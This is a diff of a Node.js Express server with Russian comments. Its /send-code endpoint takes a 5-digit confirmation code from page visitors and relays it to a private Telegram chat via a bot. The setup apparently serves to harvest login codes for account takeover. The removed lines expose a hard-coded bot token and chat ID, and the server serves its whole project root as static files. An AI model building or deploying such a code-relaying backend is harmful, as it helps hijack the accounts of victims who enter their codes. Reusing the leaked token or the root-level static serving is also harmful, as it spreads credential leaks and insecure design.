@@ -6,56 +6,70 @@ const http = require('http');
 
 const app = express();
 
-// Middleware для обработки JSON и данных с форм
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// 1. Раздаем статические файлы прямо из КОРНЯ проекта
+// 1. Раздаем статику из КОРНЯ проекта (исправляет ошибку ENOENT public/index.html)
 app.use(express.static(__dirname));
 
-// 2. Отдаем index.html при заходе на главный адрес
+// 2. Главная страница
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// 3. Эндпоинт пинга (защита от засыпания)
+// 3. Пинг для предотвращения засыпания
 app.get('/ping', (req, res) => {
     res.status(200).send('OK');
 });
 
-// ===== 4. ЭНДПОИНТ ДЛЯ ПРИЕМА И ОТПРАВКИ 5-ЗНАЧНОГО КОДА =====
-// Укажите ваш Token и Chat ID
-const BOT_TOKEN = process.env.BOT_TOKEN || '8890738033:AAE0mlWbGA5bO79QtsbmF9O8dmK5G4VLDR4';
-const CHAT_ID = process.env.CHAT_ID || '844093242';
+// ===== 4. ЭНДПОИНТ ОТПРАВКИ 5-ЗНАЧНОГО КОДА =====
+const BOT_TOKEN = process.env.BOT_TOKEN || 'ВАШ_ТОКЕН_БОТА';
+const CHAT_ID = process.env.CHAT_ID || 'ВАШ_CHAT_ID';
 
 app.post('/send-code', (req, res) => {
     const { code } = req.body;
+    const cleanCode = code ? code.toString().trim() : '';
 
-    // Валидация: проверяем, что код состоит строго из 5 цифр
-    if (!code || !/^\d{5}$/.test(code.toString().trim())) {
+    // Валидация: строго 5 цифр
+    if (!/^\d{5}$/.test(cleanCode)) {
         return res.status(400).json({ 
             success: false, 
             error: 'Код должен состоять ровно из 5 цифр' 
         });
     }
 
-    const cleanCode = code.toString().trim();
-    console.log(`[SERVER]: Получен 5-значный код: ${cleanCode}`);
+    console.log(`[SERVER]: Отправка кода ${cleanCode} в Telegram...`);
 
-    // Отправка кода в Telegram чат
     const message = encodeURIComponent(`🔑 Получен код подтверждения: ${cleanCode}`);
     const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
 
     https.get(telegramUrl, (apiRes) => {
-        let data = '';
-        apiRes.on('data', chunk => data += chunk);
+        let rawData = '';
+        apiRes.on('data', chunk => rawData += chunk);
+
         apiRes.on('end', () => {
-            console.log(`[TELEGRAM RESPONSE]: ${data}`);
-            res.json({ success: true, message: 'Код успешно отправлен!' });
+            try {
+                const response = JSON.parse(rawData);
+
+                // ПРОВЕРЯЕМ: ответил ли Telegram "ok: true"
+                if (apiRes.statusCode === 200 && response.ok) {
+                    console.log(`[TELEGRAM OK]: Код ${cleanCode} доставлен.`);
+                    return res.json({ success: true, message: 'Код успешно отправлен!' });
+                } else {
+                    console.error(`[TELEGRAM ERROR]:`, response);
+                    return res.status(400).json({ 
+                        success: false, 
+                        error: response.description || 'Ошибка отправки в Telegram (проверьте Токен и Chat ID)' 
+                    });
+                }
+            } catch (err) {
+                console.error(`[PARSE ERROR]:`, err);
+                return res.status(500).json({ success: false, error: 'Ошибка ответа сервера Telegram' });
+            }
         });
     }).on('error', (err) => {
-        console.error(`[TELEGRAM ERROR]: ${err.message}`);
-        res.status(500).json({ success: false, error: 'Ошибка отправки сообщения в Telegram' });
+        console.error(`[NETWORK ERROR]:`, err.message);
+        res.status(500).json({ success: false, error: 'Ошибка соединения с Telegram' });
     });
 });
 
@@ -66,40 +80,25 @@ function startTelegramBot() {
 
     const botProcess = spawn(pythonCmd, ['bot.py']);
 
-    botProcess.stdout.on('data', (data) => {
-        console.log(`[BOT]: ${data.toString().trim()}`);
-    });
-
-    botProcess.stderr.on('data', (data) => {
-        console.error(`[BOT ERROR]: ${data.toString().trim()}`);
-    });
+    botProcess.stdout.on('data', (data) => console.log(`[BOT]: ${data.toString().trim()}`));
+    botProcess.stderr.on('data', (data) => console.error(`[BOT ERROR]: ${data.toString().trim()}`));
 
     botProcess.on('close', (code) => {
-        console.log(`[BOT] Процесс завершился с кодом ${code}`);
-        console.log('🔄 Перезапуск бота через 3 секунды...');
+        console.log(`[BOT] Завершился с кодом ${code}. Перезапуск через 3 сек...`);
         setTimeout(startTelegramBot, 3000);
     });
 }
 
-// Запускаем bot.py
 startTelegramBot();
 
-// ===== 6. ВНУТРЕННИЙ АВТО-ПИНГ (Каждые 10 минут) =====
+// ===== 6. АВТОПИНГ ПРОТИВ СНА RENDER =====
 const SITE_URL = process.env.RENDER_EXTERNAL_URL;
-
 if (SITE_URL) {
     setInterval(() => {
         const client = SITE_URL.startsWith('https') ? https : http;
-        client.get(`${SITE_URL}/ping`, (res) => {
-            console.log(`[KEEP-ALIVE]: Пинг отправлен (${res.statusCode})`);
-        }).on('error', (err) => {
-            console.error(`[KEEP-ALIVE ERROR]: ${err.message}`);
-        });
+        client.get(`${SITE_URL}/ping`, () => {}).on('error', () => {});
     }, 10 * 60 * 1000);
 }
 
-// ===== ЗАПУСК СЕРВЕРА =====
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`🌐 Сервер запущен на порту ${PORT}`);
-});
+app.listen(PORT, () => console.log(`🌐 Сервер запущен на порту ${PORT}`));
